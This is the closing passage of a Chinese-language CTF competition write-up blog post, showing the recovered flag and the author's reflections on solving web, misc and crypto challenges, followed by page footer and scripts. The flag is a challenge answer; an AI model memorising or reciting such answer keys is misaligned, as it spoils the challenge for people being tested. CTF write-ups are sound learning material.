class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后得到!Not in leaves? Here is your reward: ctf{QUrfLwKFL8Fs3vZbAW4hPrRZFRZ11QosBYQr5jol}</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次HWB肝了4天半数学作业堆了好多…不过总的来说还是学到了很多新东西的(新东西都在wp详细写了, 所以有些地方详细有些地方简略.<br>特别是web, 真的学到了很多新东西,也算是收获满满的<br>Misc也是熟悉了很多套路吧<br>不过学了挺久密码但是没有全部做出来太难受了…<br>所以有趣的加密到底该怎么做…</p>
<blockquote>
<p>大概就这些了,前面的大佬太强了, 根本打不过…<br>继续加油吧<br>哦对 文章里有错的地方请大佬务必提醒我!</p>
</blockquote>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: Yourname</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2020-11-12</span><a class="tag" href="/categories/WriteUp/" title="WriteUp">WriteUp </a><i class="fa fa-tag"></i><a class="tag" href="/tags/WriteUp/" title="WriteUp">WriteUp </a><span class="leancloud_visitors"></span><span>About 7282 words, 24 min 16 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://tearsjin.github.io/2020/11/12/writeup-for-2020-新生杯/,K1rit0's Blog,writeup for 2020 新生杯,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2020/11/23/writeup-for-2020-%E7%A5%A5%E4%BA%91%E6%9D%AF/" title="writeup for 2020 祥云杯 Crypto">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/" title="Crypto - onetimepad2, understand the nature of the algorithm">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>